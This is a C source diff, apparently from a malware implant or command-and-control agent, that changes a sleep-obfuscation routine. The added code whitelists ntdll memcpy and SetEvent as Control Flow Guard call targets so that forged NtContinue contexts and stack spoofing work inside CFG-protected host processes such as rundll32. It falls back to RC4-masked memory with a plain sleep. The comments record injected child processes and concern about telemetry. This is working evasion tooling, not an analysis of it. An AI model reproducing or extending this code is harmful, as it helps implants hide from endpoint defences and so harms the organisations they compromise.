@@ -554,32 +554,6 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 	unsigned char * rsp_at_wait;
 	BOOL ok = FALSE;
 
-	/* CFG guard: on CFG-enabled hosts NtContinue validates the target RIP
-	 * against the call bitmap - ntdll!memcpy is not a valid indirect
-	 * target there, so every beat died at
-	 * RtlpTpTimerCallback -> ZwContinue -> LdrpHandleInvalidUserCallTarget
-	 * (round 17: spawn children injected into rundll32, c0000409; our EXE
-	 * carriers carry no CFG, which is why the ROP form worked there).
-	 * Degrade to the 1a window: full RC4 masking, plain pointer sleep, no
-	 * stack spoof. Revisit via SetProcessValidCallTargets or a CFG-valid
-	 * copy primitive (roadmap). */
-	{
-		typedef BOOL (WINAPI *GPMP)(HANDLE, int, void *, size_t);
-		GPMP pgpmp = (GPMP)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcessMitigationPolicy");
-		struct { DWORD flags; } cfg;
-		cfg.flags = 0;
-		if (pgpmp != NULL && pgpmp(GetCurrentProcess(), 6 /* ProcessControlFlowGuardPolicy */,
-		                           &cfg, sizeof(cfg)) && (cfg.flags & 1)) {
-			void (WINAPI *psleep)(DWORD) = (void (WINAPI *)(DWORD))
-				GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
-			if (psleep == NULL)
-				return FALSE;
-			maskfn(ctx);
-			psleep(time);
-			return TRUE;
-		}
-	}
-
 	if (time < 700) {
 		/* short window: the fixed 150/300ms beats would land out of order
 		 * against a wake at time+600 - serve it masked with a plain
@@ -612,6 +586,48 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 	if (pmemcpy == NULL || pcontinue == NULL || pwait == NULL ||
 	    psetevent == NULL || pdeletetq == NULL || pcloseh == NULL)
 		return FALSE;
+
+	/* CFG: image-level CFG hosts (rundll32 & friends - NOT visible via
+	 * GetProcessMitigationPolicy, which only reflects process mitigations)
+	 * make NtContinue validate the forged RIP, and ntdll!memcpy/SetEvent
+	 * are not valid indirect targets there - every beat died at
+	 * RtlpTpTimerCallback -> ZwContinue -> LdrpHandleInvalidUserCallTarget
+	 * (round 17, c0000409 x2). Ekko-style fix: whitelist the two beat
+	 * targets via SetProcessValidCallTargets (telemetry-visible - revisit
+	 * with a CFG-valid copy primitive in Phase 2); if unavailable/failing,
+	 * degrade to the 1a window (full RC4 mask, plain sleep, no spoof). */
+	{
+		typedef struct { unsigned long long offset; unsigned long long flags; } G3_CTGT;
+		typedef BOOL (WINAPI *SPVCT)(HANDLE, unsigned long long, unsigned long long, unsigned long, G3_CTGT *);
+		SPVCT pspvct = (SPVCT)GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetProcessValidCallTargets");
+		BOOL cfg_ok = FALSE;
+
+		if (pspvct != NULL) {
+			unsigned long long page = 0x1000;
+			unsigned long long targets[2];
+			int t;
+
+			targets[0] = (unsigned long long)(size_t)pmemcpy;
+			targets[1] = (unsigned long long)(size_t)psetevent;
+			cfg_ok = TRUE;
+			for (t = 0; t < 2 && cfg_ok; t++) {
+				G3_CTGT info;
+				info.offset = targets[t];
+				info.flags = 1; /* CFG_CALL_TARGET_VALID */
+				if (!pspvct(GetCurrentProcess(), targets[t] & ~(page - 1), page, 1, &info))
+					cfg_ok = FALSE;
+			}
+		}
+		if (!cfg_ok) {
+			void (WINAPI *psleep)(DWORD) = (void (WINAPI *)(DWORD))
+				GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
+			if (psleep == NULL)
+				return FALSE;
+			maskfn(ctx);
+			psleep(time);
+			return TRUE;
+		}
+	}
 
 	queue = CreateTimerQueue();
 	event = CreateEventW(NULL, FALSE, FALSE, NULL);
